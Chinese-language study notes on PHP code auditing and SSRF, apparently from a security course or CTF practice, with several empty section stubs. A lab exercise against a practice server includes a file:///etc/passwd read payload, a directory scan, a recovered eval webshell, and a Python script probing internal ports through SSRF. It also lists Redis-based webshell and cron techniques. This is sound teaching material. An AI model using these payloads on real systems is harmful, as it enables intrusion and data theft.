# 代码审计

## PHP代码审计

- 什么是代码审计：是指对源代码进行检查，寻找代码的bug，这里主要寻找可以导致安全漏洞的bug
- 代码审计的技巧（程序的两大根本：变量与函数）：
  - 根据敏感的关键字**回溯**参数的传递过程
  - 查找可控变量，**正向追踪**变量的传递过程
  - 查找敏感功能点，通读功能点代码
  - 直接通读全文代码
- 自动化审计工具：Seay、Cobra、Fortify SCA...

## SSRF漏洞

- SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
- 高危函数：file_get_contents()、fsockopen()、curl_exec()
- SSRF利用思路
  1. 利用curl自带的协议进行攻击：file://、http://、ftp://...
  2. 利用SSRF攻击本地服务
  3. 攻击数据库&缓存：
     1. Redis：六种利用方式 &rarr; 保存到www目录，创建webshell；创建SSH authotrized_keys文件；写计划任务（/var/spool/cron/ & /etc/cron.d/）；slave of 8.8.8.8 主从模式利用...
     2. Memcached：利用内存中的数据，读取管理员的Session。
     3. CounchDB
  4. 扫描网站的端口开启状态
- fastcgi漏洞：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html

### SSRF练习

1. 读取password所在文件：`http://oj.momomoxiaoxi.com:9090/index.php?url=file:///etc/passwd` &rarr; 一般只用于测试payload是否有效。
2. 使用dirsearch对目标进行扫描： `python dirsearch.py http://oj.momomoxiaoxi.com:9090 -e php`
3. 扫描出一个 `robots.txt` 文件，我们再用第一步的方法访问该文件 &rarr; `http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/robots.txt` &rarr; 其中 `/var/www/html/` 是Apache的根文件夹，扫描文件没有越权无法获得操作系统的根文件夹，认为Apache的入口文件夹为根文件夹
4. 在robots.txt文件中存在一个 `webshe11111111.php` 文件，我们用同样的方法访问该文件 &rarr; `view-source:http://oj.momomoxiaoxi.com:9090/index.php?url=file:///var/www/html/webshe11111111.php` 得到php源代码：

```php
<?php
$serverList = array(
    "127.0.0.1"
);
$ip = $_SERVER['REMOTE_ADDR'];
foreach ($serverList as $host) {
    if ($ip === $host) {
        if ((!empty($_POST['admin'])) and $_POST['admin'] === 'h1admin') {
            @eval($_POST['hacker']);
        } else die("You aren't admin!");
    } else die('This is webshell');
} ?>
```

5. 利用dict协议查看端口开启情况，以下为编写Python脚本：

```python
import requests

url = 'http://oj.momomoxiaoxi.com:9090/index.php?url='
defaultlen = len(requests.get(url+'dict://127.0.0.1:0/info').content)
print("defaultlen:%d"%defaultlen)

for x in range(1000):
    try:
        response = requests.get(url+'dict://127.0.0.1:%s/info'%str(x))
        if len(response.content) != defaultlen:
            print("Port %s, content: %s"%(str(x), response.content))
    except Exception as e:
        print(e)
        pass
```

6. 

## SSRF常见的绕过技巧

- 利用302跳转
- 利用DNS Rebinding
- 利用浏览器：127。0。0。1 &rarr;浏览器解析&rarr; 127.0.0.1

## 代码执行及命令执行漏洞

- 高危函数：

  - eval和assert函数：这两个函数原本作用于动态代码执行：

  ```php
  <?php 
      $a = $_REQUEST['hello'];
      eval("var_dump($a);");
  ?>
  ```

  - preg_replace函数
  - 文件包含注射

## 变量覆盖

## ChinaZ例题讲解



